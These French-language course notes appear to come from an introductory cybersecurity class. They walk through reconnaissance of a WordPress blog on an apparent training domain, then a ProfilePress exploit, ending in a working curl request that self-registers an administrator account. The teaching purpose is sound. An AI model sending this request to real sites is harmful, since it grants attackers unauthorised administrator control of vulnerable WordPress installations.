# Intro à la cybersécurité - 4

## Objectif
- hacker sur un site de blog

## Outils
- crt.sh - Identity Search
- Fuzzing 
- John the Ripper
- bopscrk


## Ressources
- https://crt.sh/?q=thehackingproject.org
- https://github.com/OJ/gobusterhttps://github.com/OJ/gobuster
- wappalyzer

## Etapes

1 - Reconnaissance

Prendre l'adresse du site: (ce site est le sous-domaine "nourriture" de thehackingproject.org)

- https://crt.sh/?q=thehackingproject.org -> va chercher les sous-domaines
- on a ce résultat: blog-cuisine.thehackingproject.org

Regarder le site (naviguer, clic sur les liens)

- utilisateurs:
	- VeXamgM2WM766z5 (au moins 3 articles à son nom)

- page de login
	- https://blog-cuisine.thehackingproject.org/log-in/
	- on ne peut pas s'inscrire en allant à https://blog-cuisine.thehackingproject.org/sign-up/

- https://blog-cuisine.thehackingproject.org/feed/
	- <generator>https://wordpress.org/?v=5.5.11</generator>


Technique de fuzzing (pages cachées?)

- Si l'on utilise gobuster, ce qu'il faut mettre dans le terminal:
	- d'abord il faut l'installer (https://github.com/OJ/gobuster#easy-installation)
	- gobuster -u blog-cuisine.thehackingproject.org  -w  /home/../../../decouverte.txt -s 200,302

Quels sont les plugins?

Wappalyser (plugin sur le naviguateur)

- Analyser "blog-cuisine.thehackingproject.org"
	- CMS
		WordPress 5.5.11
	- Blogs
	- Font scripts
		Font Awesome
		Google Font API
		Twitter Emoji (Twemoji)
	- Miscellaneous
		HTTP/2
		Babel
	- Web servers
		Apache
	- Programming languages
		PHP 7.3
	- Databases
		MySQL
	- JavaScript libraries
		jQuery 1.12.4
		OWL Carousel
		Select2
		core-js 2.6.11
	- UI frameworks
		Bootstrap
	- WordPress plugins
		ProfilePress 3.0
2 - Scanner

Le site est-il vulnérable? Peut-être "plugin ..." n'est pas à jour? 

- https://www.exploit-db.com/ -> ProfilePress (mettre dans la barre de recherche)


3 - Accès

- https://www.exploit-db.com/exploits/50242

	curl -X POST $URL"/wp-admin/admin-ajax.php" \
	 -H "Content-Type: application/x-www-form-urlencoded" \
	 -d "reg_username=numan" \
	 -d "reg_email=pwned@numan.com" \
	 -d "reg_password=numan" \
	 -d "reg_password_present=true" \
	 -d "wp_capabilities[administrator]=1" \
	 -d "reg_first_name=pwned" \
	 -d "reg_last_name=numan" \
	 -d "action=pp_ajax_signup"

- Ouvrir votre terminal, copier-coller l'exploit. Maintenant vous êtes inscrit!

